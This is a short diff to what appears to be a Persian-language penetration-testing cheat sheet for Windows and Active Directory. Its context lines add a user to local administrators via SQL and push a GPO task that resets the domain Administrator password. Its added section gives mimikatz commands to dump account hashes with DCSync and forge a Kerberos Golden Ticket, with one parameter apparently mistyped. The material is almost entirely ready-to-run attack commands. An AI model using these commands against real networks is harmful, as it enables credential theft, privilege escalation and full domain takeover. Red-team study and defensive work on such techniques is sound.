@@ -564,6 +564,13 @@ Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” 
 1..\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
 ```
 
+### تولید Golden Ticket با mimikatz
+
+```text
+1.mimikatz # lsadump::dcsync /user:<USER>
+2.mimikatz # kerberos::golden /user:<USER> /domain:</DOMAIN> /sid:<OBJECT SECURITY ID> /rce:<NTLM HASH> /id:<USER ID>
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
